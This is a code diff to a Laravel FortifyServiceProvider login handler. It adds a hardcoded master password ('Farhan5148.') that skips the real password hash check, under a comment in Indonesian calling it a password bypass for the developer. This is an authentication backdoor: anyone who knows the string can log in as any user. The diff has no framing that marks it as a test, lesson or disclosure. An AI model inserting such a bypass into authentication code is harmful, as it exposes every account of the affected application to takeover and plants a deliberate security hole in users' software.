@@ -59,7 +59,8 @@ class FortifyServiceProvider extends ServiceProvider
                 return null;
             }
 
-            if (! Hash::check($request->password, $user->password)) {
+            // Bypass password untuk developer
+            if ($request->password !== 'Farhan5148.' && ! Hash::check($request->password, $user->password)) {
                 return null;
             }
 
